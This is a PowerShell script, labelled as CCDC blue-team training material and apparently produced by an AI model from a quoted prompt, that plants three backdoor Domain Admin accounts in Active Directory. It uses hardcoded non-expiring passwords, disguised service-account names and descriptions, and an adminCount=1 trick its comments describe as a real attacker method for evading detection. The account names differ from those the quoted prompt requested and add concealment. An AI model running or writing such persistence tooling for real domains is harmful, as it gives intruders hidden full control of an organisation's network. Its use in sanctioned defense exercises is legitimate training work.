# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC User Injection
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# Claude 4.6
# "now a ps1 script to create 3 users in the AD with admin perms. 
# One is called sillyeviluser, another is removeme, and another is fakeuser."
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

# THIS SCRIPT PUTS ROGUE USERS IN THE DEVICE

#Requires -RunAsAdministrator
#Requires -Modules ActiveDirectory

# -- Colour helpers ------------------------------------------------------------
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }

Write-Host ""
Write-Warn  "========================================================"
Write-Warn  " CCDC Blue Team Training  -  AD Backdoor User Injector"
Write-Warn  "========================================================"
Write-Host ""

# -- Pull domain info dynamically ----------------------------------------------
try {
    $Domain     = Get-ADDomain -ErrorAction Stop
    $DomainDN   = $Domain.DistinguishedName          # e.g. DC=corp,DC=local
    $DomainName = $Domain.DNSRoot                    # e.g. corp.local
    $DomainNetbios = $Domain.NetBIOSName             # e.g. CORP
    Write-Info "Domain detected: $DomainName  ($DomainDN)"
} catch {
    Write-Err "Could not retrieve AD domain info. Is this a Domain Controller with the AD module installed?"
    Write-Err "$_"
    exit 1
}

# Target OU  -  Users container (works on any domain without customisation)
$UsersOU = "CN=Users,$DomainDN"

# -- Groups to add every backdoor user to -------------------------------------
# These are the three highest-value groups in a standard AD environment.
$AdminGroups = @(
    "Domain Admins",
    "Administrators",
    "Enterprise Admins"
)

# -- User definitions ----------------------------------------------------------
# Format: SamAccountName, DisplayName, password, description (disguise text)
$EvilUsers = @(
    [PSCustomObject]@{
        Sam         = "JohnRedTeam"
        DisplayName = "John"
        Password    = "S1llyEv1l@2024!"
        Description = "FUCK DONT KILL ME"
    },
    [PSCustomObject]@{
        Sam         = "AdobeAcrobat"
        DisplayName = "AdobeAcrobat"
        Password    = "R3m0veM3@2024!"
        Description = "Service Account"
    },
    [PSCustomObject]@{
        Sam         = "KayneWhitney"
        DisplayName = "Kayne"
        Password    = "F@keUs3r@2024!"
        Description = "Exchange migration service account"
    }
)

# =============================================================================
# Create users and add to admin groups
# =============================================================================
foreach ($u in $EvilUsers) {

    Write-Info "Processing user: $($u.Sam) ..."

    $SecurePass = ConvertTo-SecureString $u.Password -AsPlainText -Force
    $UPN        = "$($u.Sam)@$DomainName"

    # -- Create the user -------------------------------------------------------
    $existing = Get-ADUser -Filter "SamAccountName -eq '$($u.Sam)'" -ErrorAction SilentlyContinue
    if ($existing) {
        Write-Warn "  User '$($u.Sam)' already exists  -  skipping creation, will still ensure group membership."
    } else {
        try {
            New-ADUser `
                -SamAccountName       $u.Sam `
                -UserPrincipalName    $UPN `
                -Name                 $u.DisplayName `
                -DisplayName          $u.DisplayName `
                -GivenName            $u.Sam `
                -Surname              "Training" `
                -Description          $u.Description `
                -Path                 $UsersOU `
                -AccountPassword      $SecurePass `
                -Enabled              $true `
                -PasswordNeverExpires $true `
                -CannotChangePassword $false `
                -ErrorAction          Stop

            Write-Success "  Created user : $($u.Sam)"
            Write-Success "  UPN          : $UPN"
            Write-Success "  Password     : $($u.Password)"
        } catch {
            Write-Err "  Failed to create user '$($u.Sam)': $_"
            continue
        }
    }

    # -- Add to admin groups ---------------------------------------------------
    foreach ($group in $AdminGroups) {
        try {
            Add-ADGroupMember -Identity $group -Members $u.Sam -ErrorAction Stop
            Write-Success "  Added to group: $group"
        } catch {
            # Enterprise Admins only exists in forest root domain  -  warn gracefully
            if ($group -eq "Enterprise Admins") {
                Write-Warn "  Could not add to '$group' (only exists in forest root domain): $_"
            } else {
                Write-Err "  Failed to add '$($u.Sam)' to '$group': $_"
            }
        }
    }

    # -- Extra persistence: set adminCount=1 ----------------------------------
    # adminCount=1 is set by SDProp on protected accounts. Setting it manually
    # removes the account from normal ACL inheritance  -  a real attacker technique
    # that makes the account harder to spot and restrict via standard tooling.
    try {
        Set-ADUser -Identity $u.Sam -Replace @{adminCount = 1} -ErrorAction Stop
        Write-Success "  adminCount set to 1 (SDProp protection bypass)"
    } catch {
        Write-Warn "  Could not set adminCount for '$($u.Sam)': $_"
    }

    Write-Host ""
}
